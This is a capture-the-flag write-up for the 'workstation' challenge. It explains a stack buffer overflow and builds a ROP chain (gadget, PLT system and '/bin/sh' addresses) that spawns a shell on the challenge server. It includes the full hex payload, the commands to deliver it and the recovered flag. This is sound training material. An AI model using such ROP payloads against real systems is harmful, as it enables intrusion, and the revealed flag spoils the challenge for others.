# workstation

[library.m0unt41n.ch/challenges/workstation](https://library.m0unt41n.ch/challenges/workstation) ![](../../resources/pwn.svg) ![](../../resources/easy.svg) 

# TL;DR

We can access a server, with a buffer overflow on user input.
A very simple ROP attack, with all the needed parts clearly provided.

# Decompiled code

```c
int main(int argc, const char **argv, const char **envp) {
  char s[64];

  setbuf(stdout, 0LL);
  system("uname -a");
  system("date");
  printf("/bin/sh");
  putchar('\n');
  printf("Command: ");
  fgets(s, 128, stdin);
  return 0;
}
```

## A ROP gadget

```asm
$ objdump -M intel -d workstation
(...)
0000000000401166 <gadget>:
  401166:	55                   	push   rbp
  401167:	48 89 e5             	mov    rbp,rsp
  40116a:	5f                   	pop    rdi
  40116b:	c3                   	ret
  40116c:	90                   	nop
  40116d:	5d                   	pop    rbp
  40116e:	c3                   	ret
```

## system() entry in PLT

Thanks to the `system()` calls in the code, we have a convenient PLT entry
for that libc function, at `0x00401050`.

```asm
$ objdump -M intel -d workstation
(...)
0000000000401050 <system@plt>:
  401050:	ff 25 ba 2f 00 00    	jmp    QWORD PTR [rip+0x2fba]        # 404010 <system@GLIBC_2.2.5>
  401056:	68 02 00 00 00       	push   0x2
  40105b:	e9 c0 ff ff ff       	jmp    401020 <_init+0x20>

```

## "/bin/sh" string

Similarly, thanks to the `printf()` we don't even have to look for it in the libc &#128578; It's right there at `0x00402012`

```asm
$ objdump  -s .rodata workstation
(...)
Contents of section .rodata:
 402000 01000200 756e616d 65202d61 00646174  ....uname -a.dat
 402010 65002f62 696e2f73 6800436f 6d6d616e  e./bin/sh.Comman
 402020 643a2000                             d: .            
```

## No protections

The binary has most of the protections disabled

```
$ checksec --file=workstation
RELRO    STACK CANARY     NX          PIE     RPATH     RUNPATH     Symbols     FORTIFY	 Fortified Fortifiable
Partial  No canary found  NX enabled  No PIE  No RPATH  No RUNPATH  41 Symbols  No       0         2
```

In particular, it has disabled the stack canary. Together with no PIE, this means that it is simple to
exploit the buffer overflow in `fgets()` to create a ROP chain, using all above gadgets.

# Exploit

The ROP chain needs:

*   64 bytes for the `s` buffer
*   8 bytes for RBP
*   `0x0040116D`: `pop rbp` gadget
*   `0x00402012`: `/bin/sh` string address
*   `0x00401166`: `push rbp ; mov rbp,rsp ; pop rdi ; ret` gadget
*   `0x00401050`: `system()` function address in PLT.

```bash
echo "
41 41 41 41 41 41 41 41
42 41 41 41 41 41 41 41
43 41 41 41 41 41 41 41
44 41 41 41 41 41 41 41
45 41 41 41 41 41 41 41
46 41 41 41 41 41 41 41
47 41 41 41 41 41 41 41
48 41 41 41 41 41 41 41
bb bb bb bb bb bb bb bb
6d 11 40 00 00 00 00 00
12 20 40 00 00 00 00 00
66 11 40 00 00 00 00 00
50 10 40 00 00 00 00 00
0A
" | xxd -r -p - >payload
# 0.1s of sleep, between fgets() and system(), to prevent too much buffering
(cat payload ; sleep 0.1 ; cat) | ./workstation
rm -f payload 
```

(fun fact: I did this before I learned about `pwntools` in Python)

# Getting the flag

```
$ (cat payload ; sleep 0.1 ; cat) | ncat --ssl 08221469-8753-4687-8bc6-66ce70657802.library.m0unt41n.ch 1337
Linux workstation 5.15.0-116-generic #126-Ubuntu SMP Mon Jul 1 10:14:24 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
Sat Aug 24 08:46:35 UTC 2024
/bin/sh
Command: ls
flag
workstation
cat flag
shc2023{r0p3d_y0ur_w4y_1nt0_th3_w0rkst4t10n}
```

---

## `shc2023{r0p3d_y0ur_w4y_1nt0_th3_w0rkst4t10n}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
